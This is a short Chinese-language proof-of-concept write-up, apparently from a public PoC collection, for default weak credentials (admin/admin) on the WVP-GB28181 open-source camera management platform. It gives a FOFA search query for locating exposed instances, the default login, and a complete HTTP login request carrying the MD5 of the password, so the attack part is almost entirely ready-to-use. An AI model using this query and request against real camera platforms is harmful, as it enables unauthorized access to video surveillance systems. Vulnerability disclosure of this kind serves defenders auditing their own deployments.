# WVP-GB28181摄像头管理平台存在弱口令

## 1.漏洞描述

GB28181Q是公共安全视频监控联网系统信息传输、交换、控制技术要求的标准。该标准主要定义了基于IP网络的音视频监控系统的整体架构，包括前端设备、存储设备、管理平台等组成部分，以及设备接入、流媒体传输、信令交互、存储管理、安全防护和平台管理等方面的要求。

WVP-GB28181-pr0开源物联网摄像头管理平台apiuser接口村存在信息泄露漏洞，攻击者可利用漏洞获取当前系统管理员用户名及密码进行登录系统，使系统处于极不安全的状态。

## 2.影响版本

WVP-GB28181摄像头管理平台

## 3.搜索语法

```plain
 fofa：body="国标28181"
```

## 4.漏洞复现

弱口令为

```plain
admin/admin
```

POC为

```plain
GET /api/user/login?username=admin&password=21232f297a57a5a743894a0e4a801fc3 HTTP/1.1
Host: 127.0.0.1
Sec-Ch-Ua: "Not/A)Brand";v="8", "Chromium";v="126", "Microsoft Edge";v="126"
Accept: application/json, text/plain, */*
Sec-Ch-Ua-Mobile: ?0 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0 
Sec-Ch-Ua-Platform: "Windows"
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Priority: u=1, i
Connection: close


```

响应码为200，响应包显示如下：

![image](https://github.com/hardog123/poc-exp/assets/170905460/e327ff6e-e98d-4fa1-9a8d-c41654698466)
